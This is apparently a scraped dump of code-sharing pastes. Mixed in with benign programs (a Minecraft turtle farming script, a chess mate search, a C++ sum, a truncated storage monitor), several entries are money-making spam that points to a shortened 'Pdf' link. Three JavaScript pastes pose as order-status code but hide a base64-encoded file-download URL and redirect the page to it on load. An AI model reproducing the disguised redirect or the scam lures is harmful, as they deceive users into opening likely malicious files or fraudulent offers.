id,title,username,language,date,content
Q3kyH0YG,Make $1000 15-MINUTES  (BEGINNER) HV,raheemrule,JavaScript,Thursday 10th of April 2025 01:05:53 PM CDT," 
Pdf https://tinyurl.com/privguidee


clNVji39cs
"
6JvB7WuC,Order.js,luqlegal,JavaScript,Thursday 10th of April 2025 12:55:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40608/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VCmGkTaL,farm.lua,RobinJut,Lua,Thursday 10th of April 2025 12:55:03 PM CDT,"-- Turtle farm by JackMacWindows
--
-- This is a simple farming script for ComputerCraft turtles. To use, simply
-- place a tilling turtle on top of a farming region, place a wired modem
-- connected to a chest next to the turtle, and run this script.
--
-- Features:
-- * Fully automatic field tending
-- * Automatic tilling and planting to reduce setup time
-- * Zero configuration to start a basic farm
-- * Boundaries are automatically detected, so no need to calculate size
-- * Non-rectangular and non-flat fields supported
-- * Recovery after being unloaded
-- * Automatic unloading and refueling from one or more chests
--
-- To create a farm, create a complete boundary around the dirt or grass area
-- that you want the farm to be inside. Then add water to ensure the field stays
-- fully watered. The field may be any height - the turtle will automatically
-- move up or down to continue farming. The field may also be non-rectangular,
-- but it will not detect single holes in a straight line going across the field.
-- (e.g. if a boundary is at (100, 0) to (100, 100), the boundary may not have a
-- hole taken out at (100, 25) to (100, 50).)
--
-- The turtle dispenses items when it reaches the origin point, which is the
-- place where the turtle was when the farm was started. This point must have a
-- modem next to it, with one or more chests placed next to that modem. The
-- program will prompt you to set this up if not present. (Make sure to right-
-- click the modem to turn it red and enable it.) Whenever the turtle returns to
-- this point, it will dispense all items except one stack of seeds and one stack
-- of fuel. If either of these stacks are not present, it will pick them up from
-- the chests.
--
-- Farms may have multiple different types of crops, and the turtle will attempt
-- to replace them with the same type of seed. However, these will have to be
-- planted beforehand - when planting the first crops, it will use whatever
-- seeds are found in the chest or turtle first.
--
-- If you'd like to add custom modded crops, scroll down to the ""add your own
-- here"" sections, and fill out the templates for the blocks and items you want.
--
-- If you need any help, you may ask on the ComputerCraft Discord server at
-- https://discord.computercraft.cc.

-- MIT License
--
-- Copyright (c) 2022 JackMacWindows
--
-- Permission is hereby granted, free of charge, to any person obtaining a copy
-- of this software and associated documentation files (the ""Software""), to deal
-- in the Software without restriction, including without limitation the rights
-- to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-- copies of the Software, and to permit persons to whom the Software is
-- furnished to do so, subject to the following conditions:
--
-- The above copyright notice and this permission notice shall be included in all
-- copies or substantial portions of the Software.
--
-- THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-- IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-- FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-- AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-- LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-- OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-- SOFTWARE.

local x, y, z = 0, 0, 0
local direction = 0
local invertDirection = false

-- Ground blocks that are part of the farm
local groundBlocks = {
    [""minecraft:dirt""] = true,
    [""minecraft:grass_block""] = true,
    [""minecraft:farmland""] = true,
    [""minecraft:water""] = true,
    [""minecraft:flowing_water""] = true,
    -- add your own here:
    --[""<yourmod>:<block>""] = true,
}

-- Blocks that are crops, with their maximum ages
local cropBlocks = {
    [""minecraft:wheat""] = 7,
    [""minecraft:carrots""] = 7,
    [""minecraft:potatoes""] = 7,
    [""minecraft:beetroots""] = 3,
    -- add your own here:
    --[""<yourmod>:<block>""] = <maximum age>,
}

-- Mappings of crop blocks to seed items
local seeds = {
    [""minecraft:wheat""] = ""minecraft:wheat_seeds"",
    [""minecraft:carrots""] = ""minecraft:carrot"",
    [""minecraft:potatoes""] = ""minecraft:potato"",
    [""minecraft:beetroots""] = ""minecraft:beetroot_seeds"",
    -- add your own here:
    --[""<yourmod>:<block>""] = ""<yourmod>:<seed>"",
}

-- Fuel types to pull from a chest if no fuel is in the inventory
local fuels = {
    [""minecraft:coal""] = true,
    [""minecraft:charcoal""] = true,
    [""minecraft:lava_bucket""] = true,
    -- add your own here:
    --[""<yourmod>:<item>""] = true,
}

local seedItems = {}
for k, v in pairs(seeds) do seedItems[v] = k end

local function writePos()
    local file = fs.open(""jackmacwindows.farm-state.txt"", ""w"")
    file.writeLine(x)
    file.writeLine(y)
    file.writeLine(z)
    file.writeLine(direction)
    file.writeLine(invertDirection and ""true"" or ""false"")
    file.close()
end

local function refuel()
    if turtle.getFuelLevel() == ""unlimited"" or turtle.getFuelLevel() == turtle.getFuelLimit() then return end
    for i = 1, 16 do
        if turtle.getItemCount(i) > 0 then
            turtle.select(i)
            turtle.refuel(turtle.getItemCount() - 0)
            if turtle.getFuelLevel() == turtle.getFuelLimit() then return true end
        end
    end
    if turtle.getFuelLevel() > 0 then return true
    else return false, ""Out of fuel""..turtle.getFuelLevel() end
end

local function forward()
    local ok, err = turtle.forward()
    if ok then
        if direction == 0 then x = x + 1
        elseif direction == 1 then z = z + 1
        elseif direction == 2 then x = x - 1
        else z = z - 1 end
        writePos()
        return true
    elseif err:match ""[Ff]uel"" then
        ok, err = refuel()
        if ok then return forward()
        else return ok, err end
    else return false, err end
end

local function back()
    local ok, err = turtle.back()
    if ok then
        if direction == 0 then x = x - 1
        elseif direction == 1 then z = z - 1
        elseif direction == 2 then x = x + 1
        else z = z + 1 end
        writePos()
        return true
    elseif err:match ""[Ff]uel"" then
        ok, err = refuel()
        if ok then return forward()
        else return ok, err end
    else return false, err end
end

local function up()
    local ok, err = turtle.up()
    if ok then
        y = y + 1
        writePos()
        return true
    elseif err:match ""[Ff]uel"" then
        ok, err = refuel()
        if ok then return forward()
        else return ok, err end
    else return false, err end
end

local function down()
    local ok, err = turtle.down()
    if ok then
        y = y - 1
        writePos()
        return true
    elseif err:match ""[Ff]uel"" then
        ok, err = refuel()
        if ok then return forward()
        else return ok, err end
    else return false, err end
end

local function left()
    local ok, err = turtle.turnLeft()
    if ok then
        direction = (direction - 1) % 4
        writePos()
        return true
    else return false, err end
end

local function right()
    local ok, err = turtle.turnRight()
    if ok then
        direction = (direction + 1) % 4
        writePos()
        return true
    else return false, err end
end

local function panic(msg)
    term.clear()
    term.setCursorPos(1, 1)
    term.setTextColor(colors.red)
    print(""An unrecoverable error occured while farming:"", msg, ""\nPlease hold Ctrl+T to stop the program, then solve the issue described above, run 'rm jackmacwindows.farm-state.txt', and return the turtle to the start position. Don't forget to label the turtle before breaking it."")
    if peripheral.find(""modem"") then
        peripheral.find(""modem"", rednet.open)
        rednet.broadcast(msg, ""jackmacwindows.farming-error"")
    end
    local speaker = peripheral.find(""speaker"")
    if speaker then
        while true do
            speaker.playNote(""bit"", 3, 12)
            sleep(1)
        end
    else while true do os.pullEvent() end end
end

local function check(ok, msg) if not ok then panic(msg) end end

local function tryForward()
    local ok, err, found, block
    repeat
        found, block = turtle.inspect()
        if found then
            if groundBlocks[block.name] or cropBlocks[block.name] then
                ok, err = up()
                if not ok then return ok, err end
            else return false, ""Out of bounds"" end
        end
    until not found
    ok, err = forward()
    if not ok then return ok, err end
    local lastY = y
    repeat
        found, block = turtle.inspectDown()
        if not found then
            ok, err = down()
            if not ok then return ok, err end
        end
    until found
    if groundBlocks[block.name] then
        ok, err = up()
        if not ok then return ok, err end
        turtle.digDown()
    elseif not cropBlocks[block.name] then
        while y < lastY do
            ok, err = up()
            if not ok then return ok, err end
        end
        ok, err = back()
        if not ok then return ok, err end
        return false, ""Out of bounds""
    end
    return true
end

local function selectItem(item)
    local lut = {}
    if type(item) == ""table"" then
        if item[1] then for _, v in ipairs(item) do lut[v] = true end
        else lut = item end
    else lut[item] = true end
    local lastEmpty
    for i = 1, 16 do
        local info = turtle.getItemDetail(i)
        if info and lut[info.name] then
            turtle.select(i)
            return true, i
        elseif not info and not lastEmpty then lastEmpty = i end
    end
    return false, lastEmpty
end

local function handleCrop()
    local found, block = turtle.inspectDown()
    if not found then
        if selectItem(seedItems) then turtle.placeDown() end
    elseif block.state.age == cropBlocks[block.name] then
        local seed = seeds[block.name]
        turtle.select(1)
        turtle.digDown()
        turtle.suckDown()
        if turtle.getItemDetail().name ~= seed and not selectItem(seed) then return end
        turtle.placeDown()
    end
end

local function exchangeItems()
    local inventory, fuel, seed = {}, nil, nil
    for i = 1, 16 do
        turtle.select(i)
        local item = turtle.getItemDetail(i)
        if item then
            if not seed and seedItems[item.name] then
                seed = {slot = i, name = item.name, count = item.count, limit = turtle.getItemSpace(i)}
            elseif not turtle.refuel(0) then
                inventory[item.name] = inventory[item.name] or {}
                inventory[item.name][i] = item.count
            elseif not fuel then
                fuel = {slot = i, name = item.name, count = item.count, limit = turtle.getItemSpace(i)}
            end
        end
    end
    local name = peripheral.find(""modem"", function(_, v) return not v.isWireless() end).getNameLocal()
    for _, chest in ipairs{peripheral.find(""minecraft:chest"")} do
        local items = chest.list()
        for i = 1, chest.size() do
            if items[i] then
                local item = items[i].name
                if inventory[item] then
                    for slot, count in pairs(inventory[item]) do
                        local d = chest.pullItems(name, slot, count, i)
                        if d == 0 then break end
                        if count - d <= 0 then inventory[item][slot] = nil
                        else inventory[item][slot] = count - d end
                    end
                    if not next(inventory[item]) then inventory[item] = nil end
                elseif fuel and fuel.count < fuel.limit and item == fuel.name then
                    local d = chest.pushItems(name, i, fuel.limit - fuel.count, fuel.slot)
                    fuel.count = fuel.count + d
                elseif seed and seed.count < seed.limit and item == seed.name then
                    local d = chest.pushItems(name, i, seed.limit - seed.count, seed.slot)
                    seed.count = seed.count + d
                end
            end
            if not next(inventory) then break end
        end
        if not next(inventory) then break end
    end
    if next(inventory) then
        for _, chest in ipairs{peripheral.find(""minecraft:chest"")} do
            local items = chest.list()
            for i = 1, chest.size() do
                if not items[i] then
                    local item, list = next(inventory)
                    for slot, count in pairs(list) do
                        local d = chest.pullItems(name, slot, count, i)
                        if d == 0 then break end
                        if count - d <= 0 then list[slot] = nil
                        else list[slot] = count - d end
                    end
                    if not next(list) then inventory[item] = nil end
                end
                if not next(inventory) then break end
            end
            if not next(inventory) then break end
        end
    end
    if not fuel or not seed then
        for _, chest in ipairs{peripheral.find(""minecraft:chest"")} do
            local items = chest.list()
            for i = 1, chest.size() do
                if items[i] and ((fuel and items[i].name == fuel.name and fuel.count < fuel.limit) or (not fuel and fuels[items[i].name])) then
                    local d = chest.pushItems(name, i, fuel and fuel.count - fuel.limit, 16)
                    if fuel then fuel.count = fuel.count + d
                    else fuel = {name = items[i].name, count = d, limit = turtle.getItemSpace(16)} end
                end
                if items[i] and ((seed and items[i].name == seed.name and seed.count < seed.limit) or (not seed and seedItems[items[i].name])) then
                    local d = chest.pushItems(name, i, seed and seed.count - seed.limit, 1)
                    if seed then seed.count = seed.count + d
                    else seed = {name = items[i].name, count = d, limit = turtle.getItemSpace(1)} end
                end
                if (fuel and fuel.count >= fuel.limit) and (seed and seed.count >= seed.limit) then break end
            end
            if (fuel and fuel.count >= fuel.limit) and (seed and seed.count >= seed.limit) then break end
        end
    end
end

if fs.exists(""jackmacwindows.farm-state.txt"") then
    local file = fs.open(""jackmacwindows.farm-state.txt"", ""r"")
    x, y, z, direction = tonumber(file.readLine()), tonumber(file.readLine()), tonumber(file.readLine()), tonumber(file.readLine())
    invertDirection = file.readLine() == ""true""
    file.close()
    -- check if we were on a boundary block first
    local found, block, ok, err, boundary
    local lastY = y
    repeat
        found, block = turtle.inspectDown()
        if not found then check(down()) end
    until found
    if groundBlocks[block.name] then
        check(up())
        turtle.digDown()
    elseif not cropBlocks[block.name] then
        if y == lastY then lastY = lastY + 1 end
        while y < lastY do check(up()) end
        while not back() do check(up()) end
        boundary = true
    end
    if direction == 1 or direction == 3 then
        -- we were in the middle of a rotation, finish that before continuing
        local mv = (direction == 0) == invertDirection and left or right
        if boundary then
            check(mv())
            check(mv())
            check(tryForward())
            invertDirection = not invertDirection
            mv = mv == left and right or left
            writePos()
        end
        check(mv())
        handleCrop()
        if x == 0 and z == 0 then
            while y > 0 do check(down()) end
            while y < 0 do check(up()) end
            exchangeItems()
        end
    end
elseif not peripheral.find(""minecraft:chest"") or not peripheral.find(""modem"", function(_, m) return not m.isWireless() end) then
    print[[
Please move the turtle to the starting position next to a modem with a chest.
The expected setup is the turtle next to a wired modem block, with a chest next to that modem block.
This program cannot run until placed correctly.
]]
    return
else exchangeItems() end

local ok, err
while true do
    ok, err = tryForward()
    if not ok then
        if err == ""Out of bounds"" then
            local mv = (direction == 0) == invertDirection and left or right
            check(mv())
            ok, err = tryForward()
            if not ok then
                if err == ""Out of bounds"" then
                    check(mv())
                    check(mv())
                    check(tryForward())
                    invertDirection = not invertDirection
                    mv = mv == left and right or left
                    writePos()
                else panic(err) end
            end
            check(mv())
        else panic(err) end
    end
    handleCrop()
    if x == 0 and z == 0 then
        while y > 0 do check(down()) end
        while y < 0 do check(up()) end
        exchangeItems()
        os.sleep(300)
    elseif peripheral.find(""modem"") then
        x, y, z = 0, 0, 0
        exchangeItems()
    end
    if turtle.getFuelLevel() < 100 then refuel() end
end"
kE1s44AW,EARN $900 INSTANTLY 2025 2U,raheemrule,JavaScript,Thursday 10th of April 2025 12:52:30 PM CDT," 
Pdf https://tinyurl.com/privguidee


Lt8MzJKe6X
"
vPkrnXsC,Market.js,luqlegal,JavaScript,Thursday 10th of April 2025 12:40:09 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76274/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1MFx5upG,Make $1000 15-MINUTES (BEGINNER) FM,raheemrule,JavaScript,Thursday 10th of April 2025 12:39:06 PM CDT," 
Pdf https://tinyurl.com/privguidee


f9XF3wo3nT
"
uer8ZV1p,Untitled,vitormartinotti,C++,Thursday 10th of April 2025 12:29:58 PM CDT,"#include <bits/stdc++.h>

int main(){
    int n, soma=0;
    scanf(""%d"", &n);
    while(n--){
        int num;
        scanf(""%d"", &num);
        soma += num;
    }
    printf(""%d"", soma);
}"
QPx3dkZm,EARN $900 INSTANTLY 2025⭐ G8,raheemrule,JavaScript,Thursday 10th of April 2025 12:25:42 PM CDT," 
Pdf https://tinyurl.com/privguidee


gPBwFHZYMV
"
phX4Uc0Q,Untitled,luqlegal,JavaScript,Thursday 10th of April 2025 12:24:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36701/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9gfMZ3yL,excellent 2,max2201111,Python,Thursday 10th of April 2025 12:22:46 PM CDT,"import time
import math

MATE_SCORE = 10000
INF = 10000000

# Parse FEN string into board matrix and side to move
def parse_fen(fen_str):
    parts = fen_str.split()
    rows = parts[0].split('/')
    side_to_move = parts[1]
    board = []
    for rank in rows:
        row = []
        for ch in rank:
            if ch.isdigit():
                row.extend(['.'] * int(ch))
            else:
                row.append(ch)
        board.append(row)
    # Ensure 8 columns per rank
    for i in range(len(board)):
        if len(board[i]) < 8:
            board[i].extend(['.'] * (8 - len(board[i])))
    # Ensure 8 ranks
    while len(board) < 8:
        board.append(['.'] * 8)
    return board, side_to_move

# Directions for moves of each piece type
king_dirs   = [(-1,-1), (-1,0), (-1,1), (0,-1), (0,1), (1,-1), (1,0), (1,1)]
rook_dirs   = [(-1,0), (1,0), (0,-1), (0,1)]
bishop_dirs = [(-1,-1), (-1,1), (1,-1), (1,1)]
knight_moves = [(-2,-1), (-2,1), (-1,-2), (-1,2), (1,-2), (1,2), (2,-1), (2,1)]

# Czech piece names
piece_names = {
    'p': ""pěšec"",
    'r': ""věž"",
    'n': ""jezdec"",
    'b': ""střelec"",
    'q': ""dáma"",
    'k': ""král"",
    'a': ""amazonka"",
    'c': ""kardinál"",
    'e': ""eve""
}

# Dictionary defining how each piece moves
piece_moves = {
    'p': {'dirs': [], 'sliding': False},                           # Pawn (special handling)
    'r': {'dirs': rook_dirs, 'sliding': True},                     # Rook
    'n': {'dirs': knight_moves, 'sliding': False},                 # Knight
    'b': {'dirs': bishop_dirs, 'sliding': True},                   # Bishop
    'q': {'dirs': rook_dirs + bishop_dirs, 'sliding': True},       # Queen
    'k': {'dirs': king_dirs, 'sliding': False},                    # King
    'a': {'dirs': rook_dirs + bishop_dirs + knight_moves,          # Amazonka (queen + knight)
          'sliding': True, 'knight_like': True},
    'c': {'dirs': rook_dirs + knight_moves,                        # Cardinal (rook + knight)
          'sliding': True, 'knight_like': True},
    'e': {'dirs': bishop_dirs + knight_moves,                      # Eve (bishop + knight)
          'sliding': True, 'knight_like': True}
}

# Generate all moves for the given side
def generate_moves(board, side):
    moves = []
    
    for r in range(8):
        for c in range(8):
            piece = board[r][c]
            if piece == '.':
                continue
                
            # Skip pieces of the opposite side
            if side == 'w' and not piece.isupper():
                continue
            if side == 'b' and not piece.islower():
                continue
                
            piece_type = piece.lower()
            
            # Handle pawns specially
            if piece_type == 'p':
                if side == 'w':
                    # Move forward
                    if r > 0 and board[r-1][c] == '.':
                        moves.append((r, c, r-1, c))
                        # Double move from starting position
                        if r == 6 and board[r-2][c] == '.':
                            moves.append((r, c, r-2, c))
                    # Captures
                    for dc in [-1, 1]:
                        if 0 <= c+dc < 8 and r > 0:
                            target = board[r-1][c+dc]
                            if target != '.' and target.islower():
                                moves.append((r, c, r-1, c+dc))
                else:  # Black pawn
                    # Move forward
                    if r < 7 and board[r+1][c] == '.':
                        moves.append((r, c, r+1, c))
                        # Double move from starting position
                        if r == 1 and board[r+2][c] == '.':
                            moves.append((r, c, r+2, c))
                    # Captures
                    for dc in [-1, 1]:
                        if 0 <= c+dc < 8 and r < 7:
                            target = board[r+1][c+dc]
                            if target != '.' and target.isupper():
                                moves.append((r, c, r+1, c+dc))
            # Handle all other pieces
            elif piece_type in piece_moves:
                movement = piece_moves[piece_type]
                
                # Handle knight-like moves separately for special pieces
                if movement.get('knight_like', False):
                    for dr, dc in knight_moves:
                        nr, nc = r + dr, c + dc
                        if 0 <= nr < 8 and 0 <= nc < 8:
                            target = board[nr][nc]
                            if target == '.' or (side == 'w' and target.islower()) or (side == 'b' and target.isupper()):
                                moves.append((r, c, nr, nc))
                
                # Handle sliding or non-sliding moves
                dirs = movement['dirs']
                for dr, dc in dirs:
                    # Skip knight moves which are handled separately above
                    if movement.get('knight_like', False) and (abs(dr) == 2 or abs(dc) == 2):
                        continue
                        
                    nr, nc = r + dr, c + dc
                    # For non-sliding pieces, just check one step
                    if not movement['sliding']:
                        if 0 <= nr < 8 and 0 <= nc < 8:
                            target = board[nr][nc]
                            if target == '.' or (side == 'w' and target.islower()) or (side == 'b' and target.isupper()):
                                moves.append((r, c, nr, nc))
                    # For sliding pieces, check the entire ray
                    else:
                        while 0 <= nr < 8 and 0 <= nc < 8:
                            target = board[nr][nc]
                            if target == '.':
                                moves.append((r, c, nr, nc))
                            elif (side == 'w' and target.islower()) or (side == 'b' and target.isupper()):
                                moves.append((r, c, nr, nc))
                                break
                            else:
                                break
                            nr += dr
                            nc += dc
    
    return moves

# Check if king is in check
def is_in_check(board, side):
    # Find the king
    king_char = 'K' if side == 'w' else 'k'
    king_pos = None
    
    for r in range(8):
        for c in range(8):
            if board[r][c] == king_char:
                king_pos = (r, c)
                break
        if king_pos:
            break
            
    if not king_pos:
        return False  # No king found (shouldn't happen in normal chess)
        
    # Check if the king is attacked by any opponent piece
    attacking_side = 'b' if side == 'w' else 'w'
    opponent_moves = generate_moves(board, attacking_side)
    
    for move in opponent_moves:
        _, _, tr, tc = move
        if (tr, tc) == king_pos:
            return True
    
    return False

# Get legal moves (not leaving king in check)
def get_legal_moves(board, side):
    moves = generate_moves(board, side)
    legal_moves = []
    
    for move in moves:
        fr, fc, tr, tc = move
        
        # Make the move on a copy of the board
        board_copy = [row[:] for row in board]
        board_copy[tr][tc] = board_copy[fr][fc]
        board_copy[fr][fc] = '.'
        
        # Check if the move leaves the king in check
        if not is_in_check(board_copy, side):
            legal_moves.append(move)
    
    return legal_moves

# Apply a move to a board
def make_move(board, move):
    fr, fc, tr, tc = move
    new_board = [row[:] for row in board]
    new_board[tr][tc] = new_board[fr][fc]
    new_board[fr][fc] = '.'
    return new_board

# Print board in ASCII format
def print_board(board):
    print(""  a b c d e f g h"")
    for r in range(8):
        print(f""{8-r} {' '.join(board[r])} {8-r}"")
    print(""  a b c d e f g h"")

# Get move notation
def get_move_notation(board, move):
    fr, fc, tr, tc = move
    piece = board[fr][fc]
    piece_type = piece.lower()
    
    from_square = chr(ord('a') + fc) + str(8 - fr)
    to_square = chr(ord('a') + tc) + str(8 - tr)
    
    if piece_type == 'p':
        return from_square + '-' + to_square
    else:
        piece_symbol = piece_type.upper()
        if piece.islower():
            piece_symbol = piece_symbol.lower()
        return piece_symbol + from_square + '-' + to_square

# Pure minimax without alpha-beta pruning, focused on finding mate
def minimax(board, depth, maximizing_player, side):
    # Terminal state check
    legal_moves = get_legal_moves(board, side)
    
    if not legal_moves:
        if is_in_check(board, side):
            return -MATE_SCORE if maximizing_player else MATE_SCORE, None
        else:
            return 0, None  # Stalemate
    
    if depth == 0:
        # At max depth, if no terminal state is found, return a neutral score
        return 0, None
    
    if maximizing_player:
        max_eval = -INF
        best_move = None
        
        for move in legal_moves:
            new_board = make_move(board, move)
            next_side = 'b' if side == 'w' else 'w'
            
            eval_score, _ = minimax(new_board, depth - 1, False, next_side)
            
            if eval_score > max_eval:
                max_eval = eval_score
                best_move = move
        
        return max_eval, best_move
    else:
        min_eval = INF
        best_move = None
        
        for move in legal_moves:
            new_board = make_move(board, move)
            next_side = 'b' if side == 'w' else 'w'
            
            eval_score, _ = minimax(new_board, depth - 1, True, next_side)
            
            if eval_score < min_eval:
                min_eval = eval_score
                best_move = move
        
        return min_eval, best_move

# Find complete mate sequence
def find_mate_sequence(board, side, max_depth=100):
    # Matovou posloupnost hledáme iterativním prohlubováním
    for depth in range(1, max_depth + 1):
        start_time = time.time()
        
        # Spustíme minimax s aktuální hloubkou
        maximizing = (side == 'w')
        score, best_move = minimax(board, depth, maximizing, side)
        
        end_time = time.time()
        search_time = end_time - start_time
        
        # Vypíšeme informace o aktuální hloubce na jednom řádku
        print(f""Hloubka {depth}: Čas = {search_time:.3f}s"", end="""")
        
        # Pokud byl nalezen mat
        if abs(score) >= MATE_SCORE - 100:
            print(f"", Nalezen mat v hloubce {depth}!"")
            
            # Generujeme posloupnost tahů až do matu
            move_sequence = []
            current_board = [row[:] for row in board]
            current_side = side
            current_depth = depth
            
            # Budeme postupně generovat nejlepší tahy až do matu
            while current_depth > 0:
                # Najdeme nejlepší tah pro současnou stranu
                maximizing = (current_side == 'w')
                _, best_move = minimax(current_board, current_depth, maximizing, current_side)
                
                if not best_move:
                    break
                
                # Přidáme tah do sekvence
                move_sequence.append((current_side, best_move))
                
                # Vytiskneme stav po každém tahu
                fr, fc, tr, tc = best_move
                piece = current_board[fr][fc]
                piece_type = piece.lower()
                piece_name = piece_names.get(piece_type, f""figura {piece_type}"")
                
                move_from = chr(ord('a') + fc) + str(8 - fr)
                move_to = chr(ord('a') + tc) + str(8 - tr)
                
                print(f""\nTah {len(move_sequence)}: {'Bílý' if current_side == 'w' else 'Černý'} - {piece_name.capitalize()} {move_from}-{move_to}"")
                
                # Aplikujeme tah
                current_board = make_move(current_board, best_move)
                print_board(current_board)
                
                # Přepneme stranu
                current_side = 'b' if current_side == 'w' else 'w'
                
                # Když byl tento tah mat, skončíme
                if not get_legal_moves(current_board, current_side) and is_in_check(current_board, current_side):
                    print(""\nŠach mat!"")
                    break
                
                # Zmenšíme hloubku o 1 pro další tah
                current_depth -= 1
            
            return move_sequence
        else:
            print("""")  # Nový řádek po výpisu informací o hloubce
    
    print(""Žádný mat nebyl nalezen do zadané hloubky."")
    return []

# Hlavní funkce pro analýzu pozice z FEN řetězce
def analyze_position(fen, max_depth=100):
    print(""Šachový engine s čistým minimaxem"")
    print(""================================="")
    print(f""Analyzuji pozici: {fen}"")
    
    board, side = parse_fen(fen)
    
    print(""\nPočáteční pozice:"")
    print_board(board)
    print(f""Na tahu je: {'Bílý' if side == 'w' else 'Černý'}"")
    
    # Najdeme matovou posloupnost
    mate_sequence = find_mate_sequence(board, side, max_depth)
    
    if mate_sequence:
        print(""\nKompletní matová posloupnost:"")
        for i, (move_side, move) in enumerate(mate_sequence):
            fr, fc, tr, tc = move
            
            # Zjistit typ figury a její název
            piece = board[fr][fc]
            piece_type = piece.lower()
            piece_name = piece_names.get(piece_type, f""figura {piece_type}"")
            
            # Formát tahu v šachové notaci
            move_from = chr(ord('a') + fc) + str(8 - fr)
            move_to = chr(ord('a') + tc) + str(8 - tr)
            
            # Výpis tahu
            print(f""{i+1}. {'Bílý' if move_side == 'w' else 'Černý'}: {piece_name.capitalize()} {move_from}-{move_to}"")
            
            # Aplikovat tah na šachovnici pro další iteraci
            board = make_move(board, move)
    else:
        print(""Nebyla nalezena žádná matová posloupnost."")

# Hlavní spuštění
if __name__ == ""__main__"":
    # Pozice s věží
    fen = ""8/1K2k3/r7/8/8/8/8/8 b - - 0 1""

    fen = ""8/1K6/3k1r2/8/8/8/8/8 b - - 6 4""

    fen = ""8/AK6/3k1a2/8/8/8/8/8 b - - 0 1""
    
    # Spustíme analýzu s hledáním matové posloupnosti
    analyze_position(fen, max_depth=20)"
BiC66rrF,Make $1000 15-MINUTES  (BEGINNER) HV,raheemrule,JavaScript,Thursday 10th of April 2025 12:12:18 PM CDT," 
Pdf https://tinyurl.com/privguidee


nglhFwYLkQ
"
kQ1CvqP8,Minecraft CC:ME storage monitor,dengmahalYT,Lua,Thursday 10th of April 2025 12:11:22 PM CDT,"---@diagnostic disable: undefined-global, unused-local
local itemrows=33
local fluidrows=0

local bridge = peripheral.find(""meBridge"")
if bridge == nil then error(""meBridge not found du idiot hastess vergessin"") end
local function wrapPs(peripheralName)
    local periTab={}
    local sideTab={}
    if peripheralName==nil then
        print(""Error"")
    end
    local peripherals = peripheral.getNames()
    local i2 = 1
    for i =1, #peripherals do
        if peripheral.getType(peripherals[i])==peripheralName then
            periTab[i2]=peripheral.wrap(peripherals[i])
            sideTab[i2]=peripherals[i]
            i2=i2+1
        end
    end
    if periTab~={} then
        return periTab,sideTab
    else
        return nil
    end
end
local me = wrapPs(""meBridge"")[1]
local mon = wrapPs(""monitor"")[1]
if mon==nil then
    error(""no monitor"")
end
local function CenterT(text, line, txtback , txtcolor, pos)
    if text==nil then
        text=""null""
    end
    local monX,monY = mon.getSize()
    mon.setBackgroundColor(txtback)
    mon.setTextColor(txtcolor)
    local length = string.len(text)
